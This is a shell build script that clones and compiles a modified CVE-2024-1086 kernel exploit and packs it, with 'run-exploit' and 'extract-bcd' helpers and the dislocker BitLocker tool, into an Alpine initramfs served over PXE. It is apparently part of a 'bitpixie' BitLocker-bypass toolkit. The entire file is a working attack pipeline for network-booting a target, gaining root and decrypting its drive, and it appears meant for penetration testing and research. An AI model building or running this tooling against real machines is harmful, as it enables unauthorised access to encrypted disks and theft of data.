#!/bin/bash

# Create subdirectory
sudo rm -rf src/ &&
  mkdir src && cd src

# Clone modified CVE-2024-1086 repository
git clone https://github.com/andigandhi/CVE-2024-1086_bitpixie

# Build CVE-2024-1086 exploit
cd CVE-2024-1086_bitpixie
make
cd ..

# Clone Alpine initramfs builder
git clone https://github.com/andigandhi/alpine-initrd
set -e -x

# download Alpine initramfs builder files
pushd .
cd alpine-initrd/docker/ && sudo docker build -t lucks/alpine-builder .
popd

sudo rm -rf alpine/ &&
  mkdir alpine

sudo docker run -t -i --rm -v "$PWD/alpine/:/alpine/" lucks/alpine-builder

# enable ttyS0 and add it as secure tty
sudo sed -i 's/#\(ttyS0.*\)/\1/' alpine/etc/inittab
sudo sh -c 'echo ttyS0 >> alpine/etc/securetty'

# manipulate Alpine initramfs
# copy CVE-2024-1086 exploit
sudo cp CVE-2024-1086_bitpixie/exploit alpine/bin/
# copy helper scripts
sudo cp ../Scripts/run-exploit alpine/bin/
sudo cp ../Scripts/extract-bcd alpine/bin/
sudo cp ../Scripts/help alpine/root/
# copy kernel modules (TODO: remove unnecessary modules?)
sudo mkdir alpine/lib/modules/
sudo cp -rf ../Scripts/5.14.0-1-amd64 alpine/lib/modules/5.14.0-1-amd64
# copy pre-compiled dislocker binary
sudo cp ../Scripts/dislocker/bin/* alpine/usr/local/bin/
sudo cp ../Scripts/dislocker/lib/* alpine/usr/local/lib/

# build initramfs
cd alpine/ && sudo find . | sudo cpio -o -H newc | xz -C crc32 -z -9 --threads=0 -c - > ../../alpine-initrd.xz

# remove source folder
cd ../..
sudo rm -rf src/

# move initramfs to PXE folder
mv alpine-initrd.xz ../PXE-Server

echo -e "\e[34;1mThe alpine-initrd.xz can be found in the PXE-Server folder.\e[0m"
